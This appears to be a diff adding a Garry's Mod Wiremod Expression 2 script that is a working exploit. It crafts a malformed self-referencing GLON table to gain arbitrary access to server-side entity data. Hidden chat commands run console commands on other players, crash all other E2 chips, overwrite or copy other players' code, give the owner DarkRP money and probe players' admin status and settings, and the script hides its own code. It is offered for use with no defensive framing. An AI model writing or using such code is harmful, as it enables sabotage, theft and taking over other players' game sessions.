@@ -1,0 +1,354 @@
+@name Test
+@inputs 
+@outputs 
+@persist GLON:string # exploitable glon table
+@persist Owner:entity OwnerT:table ChipT:table ContextT:table DataT:table
+@persist GlobalScopeT:table XWL:wirelink
+@trigger 
+
+# Chat commands
+# cc <player name> <console command>
+#     Runs a console command on a player whose wire_expression2_concmd convar is set to 1
+# clr (entity id)
+#     Clears the displayed code of the e2 you specify or are looking at
+# cr (entity id)
+#     Causes the e2 you specify or are looking at to hit its tick quota
+# cra
+#     Causes all e2s in the map to hit their tick quotas, except this one
+# dl (entity id)
+#     Downloads and saves the code of the e2 you specify or are looking at
+# fa
+#     Lists all expression2s in the map and their owners
+# m
+#     Sets your money to 1,000,000 in DarkRP
+# pr
+#     Lists all player's wire_expression2_concmd convar values
+# sc <code>
+#     Sets the displayed code of the e2 you are looking at
+# sca <code>
+#     Sets the displayed code of all e2s in the map except this one
+
+if (first() | duped())
+{
+    runOnChat(1)
+    
+    Owner = owner()
+    
+    # Allows this e2 to datasignal other e2s to cause their tick quotas to be checked
+    dsSetScope(2)
+    
+    Chars = format("%c%c%c%c%c%c%c%c%c%c%c", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11)
+    S1 = Chars[1]   # End
+    S2 = Chars[2]   # Table start
+    S3 = Chars[3]   # Array start
+    S4 = Chars[4]   # False
+    S5 = Chars[5]   # True
+    S6 = Chars[6]   # Number start
+    S7 = Chars[7]   # String start
+    S10 = Chars[10] # Entity start
+    S255 = format("%c", 255) # Table reference start
+    
+    GLON = ""                                     # this_table = 
+    GLON += S2                                    # {
+        GLON += S7 + "istable" + S1               #     istable = true,
+            GLON += S5
+        GLON += S7 + "size" + S1                  #     size = 1,
+            GLON += S6 + "1" + S1
+        GLON += S7 + "depth" + S1                 #     depth = 0,
+            GLON += S6 + "0" + S1
+        GLON += S7 + "s" + S1                     #     s = this_table,
+            GLON += S255 + "2" + S1
+        GLON += S7 + "stypes" + S1                #     stypes =
+            GLON += S2                            #         {
+                GLON += S7 + "istable" + S1       #             istable = true,
+                    GLON += S5
+                GLON += S7 + "s" + S1             #             s = {},
+                    GLON += S2 + S1
+                GLON += S7 + "n" + S1             #             n = {}
+                    GLON += S2 + S1
+            GLON += S1                            #         },
+        GLON += S7 + "n" + S1                     #     n = this_table,
+            GLON += S255 + "2" + S1
+        GLON += S7 + "ntypes" + S1                #     ntypes = this_table
+            GLON += S255 + "2" + S1
+    GLON += S1                                    # }
+    
+    ChipT = glonDecodeTable(GLON)
+    ChipT["name", string] = ""        # ChipT.stypes ["name"] = "s"
+    ChipT["context", array] = array() # ChipT.stypes ["context"] = "r"
+    ChipT["s", entity] = entity()     # Replace table contents with the entity
+    
+    ContextT = glonDecodeTable(GLON)
+    ContextT["data", array] = array() # ContextT.stypes ["data"] = "r"
+    ContextT["GlobalScope", array] = array() # ContextT.stypes ["GlobalScope"] = "r"
+    ContextT["s", array] = ChipT["context", array] # Replace table contents with Entity.context
+    
+    GlobalScopeT = glonDecodeTable(GLON)
+    GlobalScopeT["s", array] = ContextT["GlobalScope", array]
+    
+    DataT = glonDecodeTable(GLON)
+    DataT["s", array] = ContextT["data", array] # Replace table contents with Entity.context.data
+    
+    OwnerT = glonDecodeTable(GLON)
+    OwnerT["s", entity] = owner() # Replace table contents with owner entity
+    
+    function crashE2 (TargetChip:entity)
+    {
+        if (TargetChip:type() == "gmod_wire_expression2")
+        {
+            # TargetChip.context.prf = 1 / 0
+            # Target.context.data.datasignal.scope = 2
+            # [E2] dsSendDirect("poke", TargetChip, "") # triggers op quota check
+            
+            TargetChipT = glonDecodeTable(GLON)
+            TargetChipT["context", array] = array()     # TargetChipT.stypes ["context"] = "r"
+            TargetChipT["s", entity] = TargetChip       # TargetChipT.s = TargetChip
+            
+            TargetChipContextT = glonDecodeTable(GLON)
+            TargetChipContextT["data", array] = array() # TargetChipContextT.stypes ["data"] = "r"
+            TargetChipContextT["s", array] = TargetChipT["context", array] # TargetChipContextT.s = TargetChip.context
+            TargetChipContextT["prf", number] = 1/0     # TargetChip.context.prf = 1 / 0
+            
+            TargetChipContextDataT = glonDecodeTable(GLON)
+            TargetChipContextDataT["datasignal", array] = array() # TargetChipContextDataT.stypes ["datasignal"] = "r"
+            TargetChipContextDataT["s", array] = TargetChipContextT["data", array] # TargetChipContextDataT.s = TargetChip.context.data
+            
+            TargetChipContextDataDatasignalT = glonDecodeTable(GLON)
+            TargetChipContextDataDatasignalT["s", array] = TargetChipContextDataT["datasignal", array] # TargetChipContextDataDatasignalT.s = TargetChip.context.data.datasignal
+            TargetChipContextDataDatasignalT["scope", number] = 2 # TargetChip.context.data.datasignal.scope = 2
+            
+            dsSendDirect("poke", TargetChip, "")
+        }
+    }
+    
+    function setE2Code (TargetChip:entity, NewCode:string)
+    {
+        if (TargetChip:type() == "gmod_wire_expression2")
+        {
+            # TargetChip._buffer = NewCode
+            # TargetChip._original = NewCode
+            # TargetChip.buffer = NewCode
+            # TargetChip._original = NewCode
+            
+            TargetChipT = glonDecodeTable(GLON)
+            TargetChipT["s", entity] = TargetChip
+            TargetChipT["_buffer", string] = NewCode
+            TargetChipT["_original", string] = NewCode
+            TargetChipT["buffer", string] = NewCode
+            TargetChipT["original", string] = NewCode
+        }
+    }
+    
+    setE2Code(entity(), "# Code hidden")
+}
+
+if (chatClk())
+{
+    if (lastSpoke() == owner())
+    {
+        LastSaid = lastSaid()
+        if (LastSaid[1] == "!" || LastSaid[1] == "/")
+        {
+            hideChat(1)
+            LastSaid = LastSaid:sub(2):trim()
+            Arguments = LastSaid:explode(" ")
+            Cmd = Arguments[1, string]:lower()
+            ArgumentString = LastSaid:sub(LastSaid:find(" ") + 1)
+            UnescapedArgumentString = ArgumentString:replace("\\\\", "\\")
+            UnescapedArgumentString = ArgumentString:replace("\\n", "\n")
+            UnescapedArgumentString = ArgumentString:replace("\\r", "\r")
+            UnescapedArgumentString = ArgumentString:replace("\\t", "\t")
+            
+            EntityArgument = entity(Arguments[2, string]:toNumber())
+            
+            AimEntity = lastSpoke():aimEntity()
+            TargetEntity = AimEntity
+            if (EntityArgument:isValid())
+            {
+                TargetEntity = EntityArgument
+            }
+            
+            if (Cmd == "cc")
+            {
+                # Run console command
+                Name = Arguments[2, string]:lower()
+                PlayerList = players()
+                MatchingPlayers = array()
+                for (I = 1, PlayerList:count())
+                {
+                    if (Name == "*" || PlayerList[I, entity]:name():lower():find(Name))
+                    {
+                        MatchingPlayers:pushEntity(PlayerList[I, entity])
+                    }
+                }
+                if (MatchingPlayers:count() == 0)
+                {
+                    printColor(vec(255, 0, 0), "No matching players found.")
+                }
+                else
+                {
+                    for (I = 1, MatchingPlayers:count())
+                    {
+                        ContextT["player", entity] = MatchingPlayers[I, entity] # Entity.context.player = TargetPlayer
+                        WireExpression2ConCmd = convarnum("wire_expression2_concmd")
+                        WireExpression2ConCmdWhitelist = convar("wire_expression2_concmd_whitelist")
+                        if (WireExpression2ConCmd > 0)
+                        {
+                            Command = ArgumentString:sub(ArgumentString:find(" ") + 1)
+                            concmd(Command)                    # Entity.context.player:ConCommand (Command)
+                            ContextT["player", entity] = Owner # Entity.context.player = Owner
+                            printColor(vec(0, 128, 0), "Ran \"" + Command + "\" on " + MatchingPlayers[I, entity]:name() + ".")
+                        }
+                        else
+                        {
+                            ContextT["player", entity] = Owner # Entity.context.player = Owner
+                            printColor(vec(255, 0, 0), MatchingPlayers[I, entity]:name() + " has set wire_expression2_concmd to 0.")
+                        }
+                        ContextT["player", entity] = Owner     # Entity.context.player = Owner
+                    }
+                }
+            }
+            elseif (Cmd == "clr")
+            {
+                # Clear target code
+                
+                if (TargetEntity:type() == "gmod_wire_expression2")
+                {
+                    setE2Code(TargetEntity, "")
+                }
+            }
+            elseif (Cmd == "cr")
+            {
+                # Crash target chip
+                
+                if (TargetEntity:type() == "gmod_wire_expression2")
+                {
+                    crashE2(TargetEntity)
+                }
+            }
+            elseif (Cmd == "cra")
+            {
+                # Crash all chips
+                
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                for (I = 1, R:count())
+                {
+                    if (R[I, entity] != entity())
+                    {
+                        crashE2(R[I, entity])
+                    }
+                }
+            }
+            elseif (Cmd == "dl")
+            {
+                # Download target chip code
+                
+                if (TargetEntity:type() == "gmod_wire_expression2")
+                {
+                    TargetChipT = glonDecodeTable(GLON)
+                    TargetChipT["original", string] = ""    # TargetChipT.stypes ["original"] = "s"
+                    TargetChipT["s", entity] = TargetEntity # TargetChipT.s = TargetEntity
+                    fileWrite(TargetEntity:getName() + ".txt", TargetChipT["original", string])
+                }
+            }
+            elseif (Cmd == "fa")
+            {
+                # Find all expression 2s
+                
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                for (I = 1, R:count())
+                {
+                    Line = "[" + R[I, entity]:id() + "] " + R[I, entity]:getName() + " (" + R[I, entity]:owner():name() + ")"
+                    print(Line)
+                }
+            }
+            elseif (Cmd == "m")
+            {
+                # Set DarkRP money
+                
+                # Owner.DarkRP.money = 1000000
+                
+                OwnerT = glonDecodeTable(GLON)
+                OwnerT["DarkRPVars", array] = array() # OwnerT.stypes ["DarkRPVars"] = "r"
+                OwnerT["s", entity] = owner()         # OwnerT.s = Owner
+    
+                OwnerDarkRPVarsT = glonDecodeTable(GLON)
+                OwnerDarkRPVarsT["s", array] = OwnerT["DarkRPVars", array] # OwnerDarkRPVarsT.s = Owner.DarkRPVars
+                OwnerDarkRPVarsT["money", number] = 1000000 # Owner.DarkRPVars.money = 1000000
+            }
+            elseif (Cmd == "pr")
+            {
+                #Probe all players' wire_expression2_concmd convar
+                
+                Players = players()
+                for (I = 1, Players:count())
+                {
+                    IsAdmin = Players[I, entity]:isAdmin()
+                    IsSuperAdmin = Players[I, entity]:isSuperAdmin()
+                    
+                    # Switch chip owner to target player
+                    # Entity.context.player = [target]
+                    ContextT["player", entity] = Players[I, entity]
+                    WireExpression2ConCmd = convarnum("wire_expression2_concmd")
+                    WireExpression2ConCmdWhiteList = convar("wire_expression2_concmd_whitelist")
+                    # Switch chip owner back to original owner
+                    # Entity.context.player = realOwner
+                    ContextT["player", entity] = Owner
+                    
+                    Line = Players[I, entity]:name() + ": "
+                    if (IsSuperAdmin) { Line += "[S] " }
+                    elseif (IsAdmin) { Line += "[A] " }
+                    else { Line += "[U] " }
+                    if (WireExpression2ConCmd) { Line += "enabled" }
+                    else { Line += "disabled" }
+                    Line += " (Whitelist: " + WireExpression2ConCmdWhiteList + ")"
+                    print(Line)
+                }
+            }
+            elseif (Cmd == "sc")
+            {
+                # Set target expression2 chip code
+                
+                if (TargetEntity:type() == "gmod_wire_expression2")
+                {
+                    setE2Code(TargetEntity, ArgumentString)
+                }
+            }
+            elseif (Cmd == "sca")
+            {
+                R = array()
+                # Set all expression2 chip code
+                
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                for (I = 1, R:count())
+                {
+                    if (R[I, entity] != entity())
+                    {
+                        setE2Code(R[I, entity], ArgumentString)
+                    }
+                }
+            }
+            elseif (Cmd == "txt")
+            {
+                if (TargetEntity:type() == "gmod_wire_textscreen")
+                {
+                    GlobalScopeT["XWL", entity] = TargetEntity
+                    
+                    TargetT = glonDecodeTable(GLON)
+                    TargetT["s", entity] = TargetEntity
+                    TargetT["extended", number] = 1
+                    
+                    ContextT["player", entity] = TargetEntity:owner()
+                    
+                    XWL["String", string] = ArgumentString
+                    XWL:setString("String", ArgumentString)
+                    
+                    ContextT["player", entity] = Owner
+                }
+            }
+        }
+    }
+}
